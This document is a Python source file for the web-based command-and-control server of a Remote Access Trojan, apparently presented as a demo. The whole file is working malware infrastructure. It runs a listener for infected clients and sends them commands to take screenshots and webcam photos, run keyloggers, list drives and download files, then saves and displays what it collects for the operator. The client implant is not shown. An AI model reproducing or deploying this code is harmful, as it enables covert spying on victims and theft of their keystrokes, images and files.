#!/usr/bin/env python3
"""
RAT Web Interface
Flask-based web interface for managing RAT clients
"""

import sys
import os
import json
import base64
import time
import threading
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
import socket

# Add server modules to path
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'Server'))
from protocol import Protocol, Commands, ResponseTypes

app = Flask(__name__)
app.config['SECRET_KEY'] = 'rat_demo_secret_key'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables to track clients and server
connected_clients = {}
rat_server_socket = None
server_running = False

class WebRATManager:
    def __init__(self):
        self.clients = {}
        self.server_socket = None
        self.running = False
        
    def start_server(self, host='0.0.0.0', port=4444):
        """Start RAT server integrated with web interface"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(10)
            self.running = True
            
            print(f"[*] RAT Server listening on {host}:{port}")
            socketio.emit('server_status', {'status': 'running', 'host': host, 'port': port})
            
            # Start accepting connections in background
            threading.Thread(target=self._accept_connections, daemon=True).start()
            
        except Exception as e:
            print(f"[-] Server error: {e}")
            socketio.emit('server_status', {'status': 'error', 'message': str(e)})
    
    def _accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}"
                
                # Start client handler
                client_handler = ClientHandler(self, client_socket, client_address, client_id)
                self.clients[client_id] = client_handler
                client_handler.start()
                
                # Notify web interface
                socketio.emit('client_connected', {
                    'client_id': client_id,
                    'ip': client_address[0],
                    'port': client_address[1],
                    'timestamp': time.time()
                })
                
            except socket.error:
                if self.running:
                    print("[-] Error accepting client connection")
                break
    
    def send_command_to_client(self, client_id, command_type, **kwargs):
        """Send command to specific client"""
        if client_id in self.clients:
            return self.clients[client_id].send_command(command_type, **kwargs)
        return False
    
    def remove_client(self, client_id):
        """Remove client from active clients"""
        if client_id in self.clients:
            del self.clients[client_id]
        socketio.emit('client_disconnected', {'client_id': client_id})

class ClientHandler(threading.Thread):
    def __init__(self, manager, client_socket, client_address, client_id):
        super().__init__()
        self.manager = manager
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = client_id
        self.running = True
        self.daemon = True
        
    def run(self):
        """Main client handling loop"""
        print(f"[+] Client connected: {self.client_id}")
        
        buffer = ""
        while self.running:
            try:
                data = self.client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        self.handle_message(line.strip())
                        
            except socket.error:
                break
            except Exception as e:
                print(f"[-] Error handling client {self.client_id}: {e}")
                break
                
        self.cleanup()
    
    def handle_message(self, message: str):
        """Handle incoming message from client"""
        parsed = Protocol.parse_message(message)
        if not parsed:
            return
            
        msg_type = parsed.get('type')
        
        if msg_type == ResponseTypes.PONG:
            socketio.emit('client_heartbeat', {'client_id': self.client_id, 'timestamp': time.time()})
            
        elif msg_type == ResponseTypes.SCREENSHOT:
            payload = parsed.get('payload')
            if payload:
                # Save screenshot
                timestamp = int(time.time())
                filename = f"screenshot_{self.client_id.replace(':', '_')}_{timestamp}.png"
                filepath = os.path.join('static', 'screenshots', filename)
                
                try:
                    Protocol.decode_image(payload, filepath)
                    socketio.emit('screenshot_received', {
                        'client_id': self.client_id,
                        'filename': filename,
                        'timestamp': timestamp,
                        'url': f'/static/screenshots/{filename}'
                    })
                except Exception as e:
                    socketio.emit('error', {'message': f'Screenshot save error: {e}'})
                    
        elif msg_type == ResponseTypes.PHOTO:
            payload = parsed.get('payload')
            if payload:
                # Save photo
                timestamp = int(time.time())
                filename = f"photo_{self.client_id.replace(':', '_')}_{timestamp}.jpg"
                filepath = os.path.join('static', 'photos', filename)
                
                try:
                    Protocol.decode_image(payload, filepath)
                    socketio.emit('photo_received', {
                        'client_id': self.client_id,
                        'filename': filename,
                        'timestamp': timestamp,
                        'url': f'/static/photos/{filename}'
                    })
                except Exception as e:
                    socketio.emit('error', {'message': f'Photo save error: {e}'})
                    
        elif msg_type == ResponseTypes.POPUP:
            payload = parsed.get('payload', {})
            socketio.emit('popup_response', {
                'client_id': self.client_id,
                'response': payload,
                'timestamp': time.time()
            })
            
        elif msg_type == ResponseTypes.KEYLOG_DATA:
            payload = parsed.get('payload', {})
            socketio.emit('keylog_data', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.KEYLOG_STATUS:
            payload = parsed.get('payload', {})
            socketio.emit('keylog_status', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.FILE_LIST:
            payload = parsed.get('payload', {})
            socketio.emit('file_list', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.FILE_DOWNLOAD:
            payload = parsed.get('payload', {})
            socketio.emit('file_download', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.FILE_INFO:
            payload = parsed.get('payload', {})
            socketio.emit('file_info', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.DRIVES_LIST:
            payload = parsed.get('payload', {})
            socketio.emit('drives_list', {
                'client_id': self.client_id,
                'payload': payload
            })
            
        elif msg_type == ResponseTypes.ERROR:
            socketio.emit('client_error', {
                'client_id': self.client_id,
                'error': parsed.get('payload'),
                'timestamp': time.time()
            })
    
    def send_command(self, cmd: str, **kwargs):
        """Send command to client"""
        try:
            message = Protocol.create_command(cmd, **kwargs)
            self.client_socket.send(message.encode('utf-8'))
            return True
        except socket.error:
            return False
    
    def cleanup(self):
        """Clean up client connection"""
        self.running = False
        self.manager.remove_client(self.client_id)
        try:
            self.client_socket.close()
        except:
            pass
        print(f"[-] Client disconnected: {self.client_id}")

# Initialize RAT manager
rat_manager = WebRATManager()

@app.route('/')
def index():
    """Main dashboard page"""
    return render_template('index.html')

@app.route('/api/server/start', methods=['POST'])
def start_server():
    """Start RAT server"""
    data = request.json
    host = data.get('host', '0.0.0.0')
    port = data.get('port', 4444)
    
    if not rat_manager.running:
        threading.Thread(target=rat_manager.start_server, args=(host, port), daemon=True).start()
        return jsonify({'status': 'success', 'message': 'Server starting...'})
    else:
        return jsonify({'status': 'error', 'message': 'Server already running'})

@app.route('/api/clients')
def get_clients():
    """Get list of connected clients"""
    clients_info = []
    for client_id, handler in rat_manager.clients.items():
        clients_info.append({
            'id': client_id,
            'ip': handler.client_address[0],
            'port': handler.client_address[1],
            'connected': handler.running
        })
    return jsonify(clients_info)

@app.route('/api/command/screenshot', methods=['POST'])
def send_screenshot_command():
    """Send screenshot command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.SCREENSHOT):
        return jsonify({'status': 'success', 'message': 'Screenshot command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/popup', methods=['POST'])
def send_popup_command():
    """Send popup command to client"""
    data = request.json
    client_id = data.get('client_id')
    title = data.get('title', 'RAT Demo')
    message = data.get('message', 'Hello from RAT!')
    popup_type = data.get('type', 'info')
    
    if rat_manager.send_command_to_client(client_id, Commands.POPUP, 
                                        title=title, message=message, type=popup_type):
        return jsonify({'status': 'success', 'message': 'Popup command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/ping', methods=['POST'])
def send_ping_command():
    """Send ping command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.PING):
        return jsonify({'status': 'success', 'message': 'Ping command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/photo', methods=['POST'])
def send_photo_command():
    """Send photo command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.PHOTO):
        return jsonify({'status': 'success', 'message': 'Photo command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/keylog_start', methods=['POST'])
def send_keylog_start_command():
    """Send keylog start command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.KEYLOG_START):
        return jsonify({'status': 'success', 'message': 'Keylogger start command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/keylog_stop', methods=['POST'])
def send_keylog_stop_command():
    """Send keylog stop command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.KEYLOG_STOP):
        return jsonify({'status': 'success', 'message': 'Keylogger stop command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/file_list', methods=['POST'])
def send_file_list_command():
    """Send file list command to client"""
    data = request.json
    client_id = data.get('client_id')
    path = data.get('path')
    
    if rat_manager.send_command_to_client(client_id, Commands.FILE_LIST, path=path):
        return jsonify({'status': 'success', 'message': 'File list command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/file_download', methods=['POST'])
def send_file_download_command():
    """Send file download command to client"""
    data = request.json
    client_id = data.get('client_id')
    file_path = data.get('file_path')
    
    if not file_path:
        return jsonify({'status': 'error', 'message': 'Missing file_path parameter'})
    
    if rat_manager.send_command_to_client(client_id, Commands.FILE_DOWNLOAD, file_path=file_path):
        return jsonify({'status': 'success', 'message': 'File download command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/file_info', methods=['POST'])
def send_file_info_command():
    """Send file info command to client"""
    data = request.json
    client_id = data.get('client_id')
    file_path = data.get('file_path')
    
    if not file_path:
        return jsonify({'status': 'error', 'message': 'Missing file_path parameter'})
    
    if rat_manager.send_command_to_client(client_id, Commands.FILE_INFO, file_path=file_path):
        return jsonify({'status': 'success', 'message': 'File info command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@app.route('/api/command/get_drives', methods=['POST'])
def send_get_drives_command():
    """Send get drives command to client"""
    data = request.json
    client_id = data.get('client_id')
    
    if rat_manager.send_command_to_client(client_id, Commands.GET_DRIVES):
        return jsonify({'status': 'success', 'message': 'Get drives command sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to send command'})

@socketio.on('connect')
def handle_connect():
    """Handle client connection to WebSocket"""
    print('[*] Web client connected')
    emit('status', {'message': 'Connected to RAT Web Interface'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection from WebSocket"""
    print('[*] Web client disconnected')

if __name__ == '__main__':
    print("[*] Starting RAT Web Interface...")
    print("[*] Access the interface at: http://localhost:5000")
    socketio.run(app, debug=True, host='0.0.0.0', port=5000) 